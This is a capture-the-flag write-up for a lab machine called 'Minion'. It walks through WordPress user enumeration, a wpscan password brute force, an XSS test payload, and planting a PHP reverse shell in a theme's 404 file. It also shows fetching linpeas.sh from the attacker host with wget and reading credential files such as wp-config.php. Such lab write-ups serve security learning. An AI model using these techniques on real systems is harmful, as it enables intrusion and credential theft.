# Minion

## Setup

* Add minion.thm to /etc/hosts: `sudo nano /etc/hosts` Add in `<TARGETIP> minion.thm` as a new line in the file

> \>! spoiler





!\[\[Pasted image 20220923065821.png]]

* Optional: I like to add the save the target IP as a variable TGT which can be used in commands and save having to type it out each time. Also makes copying commands from my notes a lot easier.

!\[\[Pasted image 20220923065906.png]]

## 1. Recon and Enumeration

### 1a. nmap

Use nmap tool to start to built up a picture of what is running on the machine: Note: $TGT sudo nmap -A -T4 -p- $TGT Options explained: -A runs Version detection as well as default set of scripts -T4 is the timing template to use (0: slowest, 5: quickest) -p- scan all ports Nmap results: !\[\[Pasted image 20220923070212.png]]

Points of interest from results: Web service running on port 80: Apache 2.4.41 robots.txt file WordPress 6.0.2 /wp-admin/ (admin page?)

## 1b. View website

We can navigate to the website in browser either using the target IP `http://<TGTIP>` or by using the hostname we saved in /etc/hosts `http://minion.thm`

Loading up the website we are shown our first flag !\[\[Pasted image 20220921072832.png]]

From here I generally will browse the website as a user would (alongside viewing page sources and keeping our nmap scan results in mind) to get an idea of the websites functionality and purpose before using enumeration tools

Following the link to the Flag 1 post there is a mention of the author "minion" !\[\[Pasted image 20220923070049.png]]

There is also a comment section at the bottom of the page. I made note of this incase it could be used in the exploitation phase for possible XSS. http://minion.thm/2022/09/18/flag1/

I did not find any more interesting pages browsing through the site so will move on at this point.

Our nmap results showed from the robots.txt file that /wp-login/ is to be ignored by web crawlers. This is sometimes a clue for where to find sensitive information on websites so it is worth taking note. robots.txt can be viewed in the browser or using commands such as curl and is often worth checking out.

!\[\[Pasted image 20220921073901.png]] One extra piece of information we can gather from viewing robot.txt is that the site appears to be running PHP.

We can view the disallowed page by navigating to it directly in the browser where we find we get redirected to a login page !\[\[Pasted image 20220921074117.png]]

## 2. Exploitation

Comments Section I first looked to see if the comments section was vulnerable to XSS by adding a test comment !\[\[Pasted image 20220921122515.png]] !\[\[Pasted image 20220921122530.png]] HTML tags got removed in preview. Comment is awaiting approval

Login page To see how the page responds to input we can try credentials we do not think will work test:test !\[\[Pasted image 20220921122821.png]]

Error shows no username "test" registered. This is a useful error message compared to a typical "user and/or password incorrect" seen on most site as we can identify if a username is valid without knowing the password.

We can try common usernames (root, admin) and we also can try 'minion' (the author of the flag post)

Entering Minion gives a different error message that the password is incorrect but confirms the username exists

!\[\[Pasted image 20220923070812.png]]

Brute force login with WPSCAN http://minion.thm/wp-login.php

Using our found valid username "minion" we can try to brute force the login. Originally I tried with max-threads set to 40 but it was timing out and eventually got the command to work at 5, which is the default amount if the options is not used.

wpscan --url http://minion.thm/wp-login.php --usernames minion --passwords /usr/share/wordlists/rockyou.txt --max-threads 5 !\[\[Pasted image 20220921133836.png]] Password successfully found minion : yellow

```bash
// Some code
```

## 3. Post Compromise Enumeration

### 3a Wordpress User Compromise

Comment awaiting approval !\[\[Pasted image 20220921133914.png]]

Sample page XSS Once comments are approved XSS is found to be working

alert('XSS');

!\[\[Pasted image 20220921134352.png]]

!\[\[Pasted image 20220921134339.png]]

As we know the site runs PHP my focus turned to finding somewhere that a PHP shell could be upladed to.

Originally I tried in the uplaod media section but .php extensions are not allowed and file signatures are checked as renaming the extension is still found to be invalid.

From previous experience I have known there to be .php files in the theme files so I looked in here. The theme in use contained .html files, however other themes were available and browsing to TWENTY TWENTY-ONE theme found the desired .php extension filenames.

!\[\[Pasted image 20220923070956.png]]

!\[\[Pasted image 20220923071045.png]]

I decided to use the 404 file as it can reliably be called upon by browsing to page that doesn't exist.

I inserted the well known PHP shell from pentestmonkey which can be found at: https://github.com/pentestmonkey/php-reverse-shell changing the ip and port number to match my workstation and the netcat listener I set up choosing a high value port: !\[\[Pasted image 20220923071246.png]] Once the PHP is pasted in and the port and IP values are set appropriately click the update file button underneath to save the changes !\[\[Pasted image 20220923071425.png]]

!\[\[Pasted image 20220923071319.png]]

Now that the PHP shell code exists in the theme we can activate it in the wordpress dashboard !\[\[Pasted image 20220923071549.png]] !\[\[Pasted image 20220923071607.png]] and browse to a URL that will return the 404 code

http://minion.thm/abunchofrandomcaharactersshouldworkaljkdkasdbbb This shoudl cause the page to "hang" as we now have a web shell established as www-data !\[\[Pasted image 20220923071642.png]]

### 3 b. Web Shell

It is not neccessary but makes life a lot easier if you stabalise your shell: Stabalise shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

background the shell using `Ctrl + Z`

```
stty raw -echo; fg
```

This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and `Ctrl + C` to kill processes). It then foregrounds the shell, thus completing the process.

If shell dies and cannot see typed stuff use command `reset`

/etc/passwd !\[\[Pasted image 20220923074813.png]]

ls /home !\[\[Pasted image 20220923074905.png]]

find / -type f -name "Flag\*" 2>/dev/null

!\[\[Pasted image 20220921172623.png]]

wp-config.php !\[\[Pasted image 20220923075130.png]]

## 4 Priv esc

su minion Password reuse

wget 10.14.23.1:8080/linpeas.sh

╔══════════╣ Analyzing Wordpress Files (limit 70) -rw-r--r-- 1 www-data www-data 3194 Sep 18 23:27 /srv/www/wordpress/wp-config.php\
define( 'DB\_NAME', 'wordpress' ); define( 'DB\_USER', 'wordpress' ); define( 'DB\_PASSWORD', 'SuperDuperStrongPasswordThatIsLong' ); define( 'DB\_HOST', 'localhost' );

SUID files sudo -l dont have password

su minion

!\[\[Pasted image 20220923075231.png]] !\[\[Pasted image 20220923075255.png]] sudo -l !\[\[Pasted image 20220923075325.png]]

cat /etc/crontab

priv esc suid

su gru !\[\[Pasted image 20220923075422.png]]

!\[\[Pasted image 20220923075457.png]] GTFO bins

!\[\[Pasted image 20220923075604.png]]

!\[\[Pasted image 20220923075624.png]]
